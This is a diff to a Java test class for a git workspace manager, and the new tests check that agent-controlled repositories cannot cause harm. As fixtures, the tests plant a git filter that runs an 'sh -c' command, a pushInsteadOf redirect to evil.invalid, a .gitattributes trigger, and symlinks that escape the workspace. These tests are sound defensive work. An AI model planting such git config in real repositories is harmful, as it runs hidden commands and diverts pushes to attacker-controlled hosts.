@@ -23,6 +23,12 @@ class WorkspaceManagerTest {
     @TempDir
     Path tempDir;
 
+    private static void assumePosix() {
+        Assumptions.assumeTrue(
+            FileSystems.getDefault().supportedFileAttributeViews().contains("posix"),
+            "POSIX permissions/symlinks are not supported on this platform");
+    }
+
     private Path setRepoDir(WorkspaceManager wm, Path repoDir) throws Exception {
         Field repoDirField = wm.getClass().getDeclaredField("repoDir");
         repoDirField.setAccessible(true);
@@ -336,6 +342,7 @@ class WorkspaceManagerTest {
 
     @Test
     void cleanupDeletesSymlinkItselfAndNeverItsTarget() throws Exception {
+        assumePosix();
         Path repoDir = initRepo("symlink-repo");
         Path victim = Files.createDirectories(tempDir.resolve("victim"));
         Files.writeString(victim.resolve("data.txt"), "do not delete");
@@ -364,6 +371,7 @@ class WorkspaceManagerTest {
 
     @Test
     void commitAndPushIgnoresAgentControlledHooksAndConfig() throws Exception {
+        assumePosix();
         Path repoDir = initRepo("malicious-hooks");
         Path bare = initBare("malicious-hooks.git");
         runGit(repoDir, "remote", "add", "origin", bare.toString());
@@ -383,6 +391,7 @@ class WorkspaceManagerTest {
                 + "[filter \"evil\"]\n\tclean = sh -c 'echo filter-ran >> " + marker + "'\n"
                 + "[url \"https://evil.invalid/\"]\n\tpushInsteadOf = " + bare + "\n");
 
+        Files.writeString(repoDir.resolve(".gitattributes"), "README.md filter=evil\n");
         Files.writeString(repoDir.resolve("README.md"), "initial\nchanged\n");
 
         WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
@@ -442,6 +451,148 @@ class WorkspaceManagerTest {
     }
 
     @Test
+    void stageFreshDiffIgnoresIndexOnlyBlobsAndAssumeUnchanged() throws Exception {
+        Path repoDir = initRepo("index-only");
+        String big = "x".repeat(20_000);
+        String sha = gitOutputWithInput(repoDir, big, "hash-object", "-w", "--stdin");
+        runGit(repoDir, "update-index", "--add", "--cacheinfo", "100644," + sha + ",big.txt");
+        runGit(repoDir, "update-index", "--assume-unchanged", "big.txt");
+
+        WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
+        setRepoDir(wm, repoDir);
+
+        DiffSummary diff = wm.stageFreshDiff();
+        try {
+            assertFalse(diff.files().stream()
+                .anyMatch(file -> file.path().equals("big.txt")),
+                "index-only cache entry must not be published");
+            assertEquals(0, diff.changedBytes());
+        } finally {
+            wm.discardStaged();
+        }
+    }
+
+    @Test
+    void collectDiffCountsIndexOnlyBlobBytes() throws Exception {
+        Path repoDir = initRepo("index-only-bytes");
+        String big = "x".repeat(20_000);
+        String sha = gitOutputWithInput(repoDir, big, "hash-object", "-w", "--stdin");
+        runGit(repoDir, "update-index", "--add", "--cacheinfo", "100644," + sha + ",big.txt");
+        runGit(repoDir, "update-index", "--assume-unchanged", "big.txt");
+
+        WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
+        setRepoDir(wm, repoDir);
+
+        DiffSummary diff = wm.collectDiff();
+
+        assertTrue(diff.files().stream().anyMatch(file -> file.path().equals("big.txt")));
+        assertTrue(diff.changedBytes() >= 20_000,
+            "index-only blob bytes must be guarded, got " + diff.changedBytes());
+    }
+
+    @Test
+    void stageFreshDiffDoesNotMissSkipWorktreeModifications() throws Exception {
+        Path repoDir = initRepo("skip-worktree");
+        runGit(repoDir, "update-index", "--skip-worktree", "README.md");
+        Files.writeString(repoDir.resolve("README.md"), "initial\nmodified\n");
+
+        WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
+        setRepoDir(wm, repoDir);
+
+        DiffSummary diff = wm.stageFreshDiff();
+        try {
+            assertTrue(diff.files().stream().anyMatch(
+                file -> file.path().equals("README.md") && file.status().equals("modified")));
+            assertEquals(1, diff.additions());
+        } finally {
+            wm.discardStaged();
+        }
+    }
+
+    @Test
+    void stageFreshDiffCountsLinesFromBlobsNotGitAttributes() throws Exception {
+        Path repoDir = initRepo("diff-attribute");
+        Files.writeString(repoDir.resolve(".gitattributes"), "* -diff\n");
+        Files.writeString(repoDir.resolve("big.txt"), "line\n".repeat(5_000));
+        runGit(repoDir, "add", ".gitattributes", "big.txt");
+        runGit(repoDir, "commit", "-m", "attribute and big file");
+
+        Files.writeString(repoDir.resolve("big.txt"), "changed\n".repeat(5_000));
+
+        WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
+        setRepoDir(wm, repoDir);
+
+        DiffSummary diff = wm.stageFreshDiff();
+        try {
+            assertEquals(5_000, diff.additions());
+            assertTrue(diff.changedBytes() > 5_000);
+        } finally {
+            wm.discardStaged();
+        }
+    }
+
+    @Test
+    void protectedOldPathSurvivesRename() throws Exception {
+        Path repoDir = initRepo("rename-protected");
+        Files.writeString(repoDir.resolve("Jenkinsfile"), "pipeline {}\n");
+        runGit(repoDir, "add", "Jenkinsfile");
+        runGit(repoDir, "commit", "-m", "jenkinsfile");
+        Files.createDirectories(repoDir.resolve("docs"));
+        runGit(repoDir, "mv", "Jenkinsfile", "docs/old-jenkins.txt");
+
+        WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
+        setRepoDir(wm, repoDir);
+
+        DiffSummary diff = wm.stageFreshDiff();
+        try {
+            assertTrue(diff.files().stream().anyMatch(
+                file -> file.path().equals("Jenkinsfile") && file.status().equals("deleted")));
+            PublishingGuard guard = new PublishingGuard(
+                List.of(".env*", "**/.env*", "Jenkinsfile", ".github/**"));
+            assertThrows(IllegalStateException.class, () -> guard.assertPublishable(diff));
+        } finally {
+            wm.discardStaged();
+        }
+    }
+
+    @Test
+    void publishesTheGuardedTreeEvenIfWorktreeChangesAfterGuard() throws Exception {
+        Path repoDir = initRepo("guarded-tree");
+        Path bare = initBare("guarded-tree.git");
+        runGit(repoDir, "remote", "add", "origin", bare.toString());
+        String trustedConfig = Files.readString(repoDir.resolve(".git/config"));
+
+        Files.writeString(repoDir.resolve("feature.txt"), "guarded\n");
+        WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
+        setRepoDir(wm, repoDir);
+        setField(wm, "trustedGitConfig", trustedConfig);
+
+        DiffSummary diff = wm.stageFreshDiff();
+        new PublishingGuard(List.of()).assertPublishable(diff);
+        Files.writeString(repoDir.resolve("feature.txt"), "changed-after-guard\n");
+        wm.commitAndPushStaged("feat: guarded tree", "feature");
+        wm.discardStaged();
+
+        assertEquals("guarded", gitOutput(bare, "show", "refs/heads/feature:feature.txt"));
+    }
+
+    @Test
+    void writeFilesRefusesSymlinkedParentOutsideWorkspace() throws Exception {
+        assumePosix();
+        Path repoDir = initRepo("symlink-write");
+        Path victim = Files.createDirectories(tempDir.resolve("write-victim"));
+        Files.createSymbolicLink(repoDir.resolve("link"), victim);
+
+        WorkspaceManager wm = new WorkspaceManager(tempDir.toString(), "test-repo", false, null);
+        setRepoDir(wm, repoDir);
+        FileOperation op = new FileOperation(
+            "link/escape.txt", "escaped", FileOperation.Action.CREATE);
+
+        assertThrows(IOException.class, () -> wm.writeFiles(List.of(op)));
+        assertFalse(Files.exists(victim.resolve("escape.txt")));
+    }
+
+    @Test
     void stripCredentialsRemovesGitHubToken() {
         assertEquals(
             "https://github.com/owner/repo.git",
@@ -459,6 +610,10 @@ class WorkspaceManagerTest {
     }
 
     private static void runGit(Path directory, String... args) throws Exception {
+        gitOutput(directory, args);
+    }
+
+    private static String gitOutput(Path directory, String... args) throws Exception {
         List<String> command = new ArrayList<>();
         command.add("git");
         command.addAll(List.of(args));
@@ -469,5 +624,22 @@ class WorkspaceManagerTest {
         String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
         int exit = process.waitFor();
         assertEquals(0, exit, "git " + String.join(" ", args) + " failed: " + output);
+        return output.strip();
+    }
+
+    private static String gitOutputWithInput(Path directory, String input, String... args) throws Exception {
+        List<String> command = new ArrayList<>();
+        command.add("git");
+        command.addAll(List.of(args));
+        Process process = new ProcessBuilder(command)
+            .directory(directory.toFile())
+            .redirectErrorStream(true)
+            .start();
+        process.getOutputStream().write(input.getBytes(StandardCharsets.UTF_8));
+        process.getOutputStream().close();
+        String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+        int exit = process.waitFor();
+        assertEquals(0, exit, "git " + String.join(" ", args) + " failed: " + output);
+        return output.strip();
     }
 }
